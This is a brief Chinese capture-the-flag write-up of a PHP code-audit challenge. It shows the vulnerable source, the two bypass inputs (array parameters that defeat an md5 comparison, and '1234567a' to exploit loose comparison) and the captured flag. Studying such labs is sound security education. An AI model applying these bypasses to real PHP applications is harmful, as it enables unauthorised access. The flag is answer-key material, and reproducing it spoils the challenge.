#### 点击进入靶场，是一堆没有格式化的代码
#### 代码审计（md5和php弱类型比较）
##### 查看源代码（添加了部分注释）
```php
if(isset($_GET['gg'])&&isset($_GET['id'])) {
    $id=$_GET['id'];
    $gg=$_GET['gg'];
    if (md5($id) === md5($gg) && $id !== $gg) {     // 要求$id和$gg的md5不同但是加密结果相同
        echo 'You got the first step';
        if(isset($_POST['passwd'])) {
            $passwd=$_POST['passwd'];
            if (!is_numeric($passwd))     // $passwd不是数字类型
            {
                 if($passwd==1234567)    // $passwd == 1234567，弱类型比较
                 {
                     echo 'Good Job!';
                     highlight_file('flag.php');
                     die('By Retr_0');
                 }
                 else
                 {
                     echo "can you think twice??";
                 }
            }
            else{
                echo 'You can not get it !';
            }

        }
        else{
            die('only one way to get the flag');
        }
}
    else {
        echo "You are not a real hacker!";
    }
}
else{
    die('Please input first');
}
```

##### 1、$id和$gg的md5不同但是加密结果相同
```php
md5($id) === md5($gg) && $id !== $gg
```
##### 方法如下
```
数组绕过：php的md5函数无法处理数组，如果传入数组，则会返回none
因此传参为:?gg[]=1&id[]=2
```

##### 2、弱类型比较
```php
!is_numeric($passwd)
$passwd==1234567
```
##### 既要不是数字还要和1234567相等
```
弱类型比较（注意是POST提交）
passwd=1234567a
```

#### 得到flag
```
flag{37073e7c-7771-4bde-9ee0-745e5c394487}
```
